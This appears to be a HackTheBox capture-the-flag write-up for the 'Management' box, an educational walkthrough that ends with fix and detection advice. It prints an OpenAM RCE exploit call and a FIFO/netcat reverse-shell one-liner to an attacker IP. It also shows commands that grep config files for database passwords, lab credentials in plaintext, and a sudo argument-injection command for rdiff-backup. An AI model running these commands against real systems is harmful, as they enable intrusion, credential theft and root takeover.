# Management

| Field | Value |
|---|---|
| Author | @yourhandle |
| Platform | HackTheBox |
| Category & Difficulty | Linux, Easy |
| Status | Retired / Live |
| Date | 2026-11-21 |
| Skills exercised | Pre-auth Java deserialization RCE, secret extraction, crypto decryption, credential reuse, sudo argument injection |

## TL;DR

The SSO portal on `sso.management.htb` runs an OpenAM build vulnerable to an unauthenticated RCE (CVE-2026-33439) in the password-reset validation endpoint, which returns command output in the HTTP response. From the `openam` service account we read the GLPI database password, dumped the encrypted LDAP bind secret from `glpi_authldaps`, and decrypted it with the GLPI key file — the plaintext turned out to be reused as `owen`'s system password. `owen` could run `rdiff-backup` as root via a sudoers wildcard, and a repeated `--restrict-path` (last one wins) let us mirror `/root` to `/tmp`.

## Reconnaissance & Enumeration

- `nmap -sC -sV -p- 10.129.244.176` → 22, 80, 443, 389, 3306. The TLS cert and redirects revealed the two vhosts `management.htb` and `sso.management.htb`; the latter served an **OpenAM** login console. → Suggested attacking the SSO product first, since it exposes a large pre-auth surface.
- Added both names to `/etc/hosts` so Host/SNI-based routing worked consistently:
  ```bash
  echo '10.129.244.176 management.htb sso.management.htb' | sudo tee -a /etc/hosts
  ```
- `management.htb` served a **GLPI** helpdesk instance backed by a local MariaDB → suggested the SSO and helpdesk share an identity store, i.e. credentials harvested in one may unlock the other.

**Dead end:** my first download was a PoC for `CVE-2026-63219` (a GeoNetwork bug) whose CLI wanted `--ip/--port/--target`. It errored immediately and had nothing to do with this stack — discarded, and I made sure to match the CVE to the *product* on the box before pulling code again.

## Vulnerability Analysis

- **Identified:** CVE-2026-33439 — unauthenticated Java deserialization in OpenAM's `PWResetUserValidation` endpoint, reachable at `https://sso.management.htb/openam/ui/PWResetUserValidation`.
- **Confirmed manually:** the PoC takes a positional command and echoes its stdout in the HTTP body. `id` returned `uid=996(openam) gid=987(openam)` — proof of execution, no shell needed yet.
- **Impact:** pre-auth remote code execution as the `openam` service account, which on this host can read the GLPI configuration and its crypto material.

## Exploitation & Post-Exploitation

1. **Initial access — OpenAM RCE.** Chosen over the GLPI instance because it needed no credentials at all. Verified with:
   ```bash
   python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation 'id'
   ```
2. **Foothold / shell.** Upgraded command execution to a reverse shell through a FIFO and netcat; the PoC request itself times out while the shell holds the connection, which is expected — the listener already has the shell.
   ```bash
   python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation \
     'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.95 4444 > /tmp/f'
   ```
   Stabilized with `python3 -c 'import pty; pty.spawn("/bin/bash")'`.
3. **Secret extraction — GLPI config.** The default `glpi:glpi` DB login was rejected, so I read the real password out of the app's config instead of guessing:
   ```bash
   grep -rEi "dbpass|dbpassword|password" /var/www/html/glpi/config/ /opt/glpi/config/ /etc/glpi/ 2>/dev/null
   # /opt/glpi/config/config_db.php: public $dbpassword = '8rhu0L6Pw4Y7';
   mysql -h localhost -u glpi -p'8rhu0L6Pw4Y7' glpidb
   ```
4. **Credential recovery — decrypting the LDAP secret.** GLPI stores bind passwords encrypted, not hashed:
   ```sql
   SELECT id, name, rootdn, rootdn_passwd FROM glpi_authldaps;
   ```
   The ciphertext is `nonce || XChaCha20-Poly1305(plaintext, AAD=nonce)`, with the key in `glpicrypt.key`. Both the key and the ciphertext were readable from the `openam` context, so decryption happened on-box with PHP's libsodium bindings. *(First attempt used `/var/www/html/glpi/config/glpicrypt.key` and failed — `find / -name glpicrypt.key` showed the real path was `/opt/glpi/config/glpicrypt.key`.)*
5. **Lateral movement — password reuse.** The decrypted value (`WpczC40GhTbk`) was the LDAP service credential **and** `owen`'s local password. `su owen` succeeded; `user.txt` was readable.
6. **Privilege escalation — rdiff-backup sudo wildcard.**
   ```
   (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
   ```
   The trailing `*` allows extra arguments after the fixed prefix. `rdiff-backup` honors the **last** occurrence of a repeated flag, so injecting a second `--restrict-path` widens the read jail. The `%s` placeholder in `--remote-schema` is filled with the (empty) host portion of the source spec `/::/root`, so the injected path resolves to `/`:
   ```bash
   rdiff-backup --remote-schema \
     "sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s" \
     backup /::/root /tmp/root_backup
   cat /tmp/root_backup/root.txt
   ```
   **Dead end worth remembering:** prefixing the whole client invocation with `sudo` makes `sudo` reject the command, because the first arguments are no longer `--server --restrict-path …` and therefore don't match the rule. `sudo` must live *inside* the `--remote-schema` string, not in front of the client.

Scripts: `scripts/exploit.sh`, `scripts/enum_glpi.sh`, `scripts/decrypt_glpi.php`, `scripts/privesc_rdiff.sh`.

## Flag

- User: `HTB{<redacted>}` — `/home/owen/user.txt`
- Root: `HTB{<redacted>}` — `/tmp/root_backup/root.txt` (mirrored from `/root/root.txt`)

## Lessons Learned

- **Method:** Match the CVE to the *product banner* before downloading a PoC. A wrong-but-plausible exploit repo costs more time than a careful `whatweb` + version check.
- **Pattern:** Applications that can't store secrets one-way (GLPI, backup tools, mail relays) keep decryptable material on disk. If you get code execution as a service account, look for the **key file next to the ciphertext** — decryption beats cracking every time.
- **Pattern:** Password reuse between an app's directory-bind account and a real system user is the cheapest lateral movement there is. Always try recovered service passwords against local users.
- **Technique:** A wildcard in a sudoers entry that ends in `*` is argument injection, not just "extra flags." Check whether the target binary lets a repeated option override an earlier one.
- **Tooling:** The exploit returned command output directly — use `id` first, then only bother with a reverse shell once execution is proven.

## Mitigation & Detection

- **Fix:**
  - Patch OpenAM past CVE-2026-33439; the endpoint should never deserialize unauthenticated input.
  - Restrict `glpicrypt.key` to root (it was `0644 www-data:www-data` and readable by the `openam` account) — key material must not be readable by any other service principal.
  - Break the `svc-glpi` → `owen` password reuse; rotate on discovery.
  - Remove the wildcard from the sudoers rule, or wrap `rdiff-backup` in a script that validates a fixed path and drops the ability to pass `--remote-schema`.
- **Detect:**
  - Proxy/WAF: alert on requests to `/openam/ui/PWResetUserValidation` carrying serialized blobs or unexpected headers, especially from unauthenticated clients.
  - Host: auditd on `execve` of `rdiff-backup` as root with `--remote-schema`, and on reads of `glpicrypt.key` by anything other than the GLPI PHP-FPM pool.
  - MariaDB: alert on `SELECT … rootdn_passwd` from `glpi_authldaps`.

---

# Scripts

Drop these under `htb-management/scripts/`. All are parameterized — no hardcoded target IPs or flags. See the `scripts/` directory for `exploit.sh`, `enum_glpi.sh`, `decrypt_glpi.php`, and `privesc_rdiff.sh`.

### Suggested repo layout

```
htb-management/
├── htb-management.md
└── scripts/
    ├── exploit.sh
    ├── enum_glpi.sh
    ├── decrypt_glpi.php
    └── privesc_rdiff.sh
```
